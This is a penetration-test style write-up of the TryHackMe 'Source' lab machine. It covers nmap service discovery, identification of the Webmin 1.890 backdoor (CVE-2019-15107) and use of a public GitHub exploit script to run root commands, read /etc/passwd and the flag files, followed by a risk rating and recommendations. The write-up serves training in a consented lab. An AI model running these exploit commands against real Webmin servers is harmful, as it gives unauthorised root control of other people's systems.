## Penetration Test Report
of "Source" machine (https://tryhackme.com/room/source)
09.22.2022


Duck9001
mail: notreal@mail.really

### Table of contents:
Exective summary
Summary of results
Attack narrative
Conclusion
Risk rating
Recommendations

### Executive summary
With owner consent I conducted a penetration test of Source machine (https://tryhackme.com/room/source).

Efforts were placed on identification and exploitation of security weaknesses that could allow a remote attacker to gain unauthorised access to organizational data.

Specific goal was to access data stored in `root.txt` and `user.txt`.

### Summary of results
Initial scan of Source ports revealed vulnerable https service that allowed Remote Code Execution (RCE).

Moreover logging interface of that service provided no bruteforce protection. However bruteforce of that service was not succefull.

### Attack narrative
#### Service identification
`sudo nmap -Pn -sS 10.10.42.179`
```
22/tcp    open  ssh
10000/tcp open  snet-sensor-mgmt
```


`sudo nmap -sV -p 22 10.10.42.179`
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
It looks like machine is an Ubuntu server

`sudo nmap -sV -p 10000 10.10.42.179`
```
PORT      STATE SERVICE VERSION
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
```
service: Webmin 1.890


#### RCE
`Webmin 1.890` vulnerability found in [vulners](https://vulners.com/search) database
```
# CVE-2019-15107

An issue was discovered in Webmin <=1.920. The parameter old in password_change.cgi contains a command injection vulnerability
```
That vulnerability is a result of supply chain attack on one of the Webmin developers. Hacker embeded a backdoor enabling RCE if adequate payload is present in HTTP POST request body.

exploit found on [github](https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE/blob/master/webmin-1.890_exploit.py)
it works by crafting HTTP POST requests with mentioned above payload.
`sudo python3 webmin-1.890_exploit.py 10.10.42.179 10000 'id;whoami;groups'`
```
uid=0(root) gid=0(root) groups=0(root)
root
root
```

RCE with root privileges result in a complete compromise of target.

#### Locating assets
Because Ubuntu uses `apt` by default I correctly assumed it's installed
`sudo python3 webmin-1.890_exploit.py 10.10.132.155 10000 'apt list' > ~/Workspace/dir/list`
I gained a list of all installed tools to use

`sudo python3 webmin-1.890_exploit.py 10.10.42.179 10000 'cat /etc/passwd' | grep "bash"`
```
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1710    0  1659  100    51   6561    201 --:--:-- --:--:-- --:--:--  6785
root:x:0:0:root:/root:/bin/bash
dark:x:1000:1000:Dark:/home/dark:/bin/bash
```
username is dark

`sudo python3 webmin-1.890_exploit.py 10.10.42.179 10000 'cd /home/dark; cat user.txt'` - User asset

`sudo python3 webmin-1.890_exploit.py 10.10.42.179 10000 'cat /root/root.txt'` - Root asset

### Conclusion
Source suffered vulnerability that would have dramatic effect if malicious party had expoited it.

The specific goals of penetration test was to gain read access to `user.txt` and `root.txt`. Both of them were met.

It is important to note, that that vulnerability is a threat not only to assets, but also **Identity Management**, **Authentication**, and **Access Control** especially, if webserver is a trusted node on infrastructure network.

### Risk rating
According to CVSS V3:

**`Critical`** (>9) - exploitation is straightforward, results in system-level compromise

### Recommendations
1. Frequent updates of installed software - when supply chain attack (or other vulnerabilities) are discovered maintainers patch them
2. Port-knocking implementation - if webserver is meant for non-public purposes port-knocking would decrease likelihood of service detection
3. Regular vulnerability assasments


